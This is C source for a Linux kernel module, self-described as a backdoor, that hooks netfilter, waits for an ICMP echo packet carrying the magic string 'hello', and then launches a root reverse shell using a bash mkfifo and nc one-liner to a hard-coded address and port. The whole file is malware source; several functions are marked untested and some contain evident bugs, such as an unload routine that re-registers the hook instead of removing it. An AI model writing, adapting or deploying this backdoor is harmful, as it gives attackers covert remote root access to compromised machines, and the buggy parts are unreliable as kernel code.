/*
* main.c - basic kernel module
*/
#include <linux/module.h>  // Needed by all kernel modules
#include <linux/kernel.h>  // Needed for KERN_INFO
#include <linux/init.h>    // Needed for macros
#include <linux/kmod.h>
#include <linux/moduleparam.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/mutex.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>

#include <linux/icmp.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/workqueue.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/interrupt.h>
#include <linux/hrtimer.h>

#include <linux/version.h>
#include <linux/net.h>
#include <linux/tcp.h>
#include <linux/udp.h>

// Move later to "conf.h" file!
#define DEBUG 1

#define MAGIC_VALUE "hello"
/////////////////////

// Change later:
MODULE_LICENSE("GPL");
MODULE_AUTHOR("CyberName");
MODULE_DESCRIPTION("User mode reverse shell");
MODULE_VERSION("0.1");
//////////////////////////////


int reverse_shell_working = 0;
// global netfilter hook - used for registering hook
static struct nf_hook_ops *netf_hook = NULL;

// for icmp_listener
struct auth_icmp {
    unsigned int auth;
    unsigned int ip;
    unsigned short port;
};

void debugPrint(char *printMe) {
	#if DEBUG
	printk(printMe);
	#endif
}

// Create reverse shell (currently hard coded to [localhost:1234])
// tested - working.
void start_reverse_shell(char *ip, char *port) {
	char *envp[] = {
		"HOME=/root",
		"TERM=xterm",
		"IP_ADDR=127.0.0.1",
		"PORT_ADDR=1234",
		NULL
	};

	char *argv[] = {
		"/bin/bash",
		"-c",
		"/bin/rm /tmp/a;/usr/bin/mkfifo /tmp/a; /bin/cat /tmp/a | /bin/sh -i 2>&1 | /bin/nc $IP_ADDR $PORT_ADDR > /tmp/a",
		NULL
	};

	debugPrint("Start reverse shell...\n");
	reverse_shell_working = 1;

	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

	printk("Reverse shell ended.\n");
	reverse_shell_working = 0;
}

// Search for ICMP Echo packets with the data "hello". 
// If found, create reverse shell to localhost.
// not tested.
unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	const struct iphdr *ip_header;
	const struct icmphdr *icmp_header;
	struct iphdr _iph;
	struct icmphdr _icmph;
	const char *data = NULL;
	char *_data;
	int size, str_size;

	if (!skb)
		return NF_ACCEPT;

	ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);

	// Make sure everything works
	if (!ip_header)
		return NF_ACCEPT;
	if (!ip_header->protocol)
		return NF_ACCEPT;

	// Check for IPID (maybe later!)
	// if (htons(ip_header->id) != IPID)
	// 	return ACCEPT;

	// Make sure we're ICMP
	if (ip_header->protocol == IPPROTO_ICMP) {
		icmp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_icmph), &_icmph);

		if (!icmp_header)
			return NF_ACCEPT;

		// Make sure it's ping
		if (icmp_header->code != ICMP_ECHO)
			return NF_ACCEPT;

		debugPrint("Got echo request! Checking for magic value.");
		// Check seq and win numbers! maybe later.
		// if (htons(icmp_header->un.echo.sequence) == SEQ &&
		//     htons(icmp_header->un.echo.id) == WIN) {

		// Calculate where the data of the packet is...
		size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
		_data = kmalloc(size, GFP_KERNEL);

		if (!_data)
			return NF_ACCEPT;

		str_size = size - strlen(MAGIC_VALUE);

		data = skb_header_pointer(skb, ip_header->ihl * 4 + sizeof(struct icmphdr), size, &_data);

		if (!data) {
			kfree(_data);
			return NF_ACCEPT;
		}

		// Check if data of packet is our magic value (hello)
		if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {

			debugPrint("Got ICMP Packet with magic value!");

			if (!reverse_shell_working)
				start_reverse_shell("127.0.0.1", "1234");

			kfree(_data);

			// Drop the packet - we don't need to answer that
			return NF_DROP;
		}

		kfree(_data);
	}
	// }

	return NF_ACCEPT;
}

// Register our packets filter
// not tested.
static int register_icmp_listener(void)
{
	int ret;

	debugPrint("Registerig icmp_listener");
	netf_hook = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	/* set flags and function for netfilter */
	netf_hook->hook = (nf_hookfn*)icmp_listener;
	netf_hook->hooknum = NF_INET_LOCAL_IN;
	netf_hook->pf = PF_INET;
	netf_hook->priority = NF_IP_PRI_FIRST;

	/* register our netfilter hook */
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
		debugPrint("Linux version high");
    	ret = nf_register_net_hook(&init_net, netf_hook);
	#else
    	ret = nf_register_hook(&netf_hook);
	#endif

	// ret = nf_register_hook(&netf_hook);

	if(ret < 0)
		return 1;

	return 0;
}

// Unregister our netfilter!!!
// Not tested.
void unregister_icmp_listener(void) {
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    	nf_register_net_hook(&init_net, &netf_hook);
	#else
    	nf_register_hook(&netf_hook);
	#endif
}

// Start module
static int __init start_module(void) {
	debugPrint(KERN_INFO "Started backdoor.\n");

	register_icmp_listener();
	return 0;
}

// Remove module
static void __exit stop_module(void) {
	unregister_icmp_listener();
	debugPrint(KERN_INFO "Stopped backdoor.\n");
}

module_init(start_module);
module_exit(stop_module);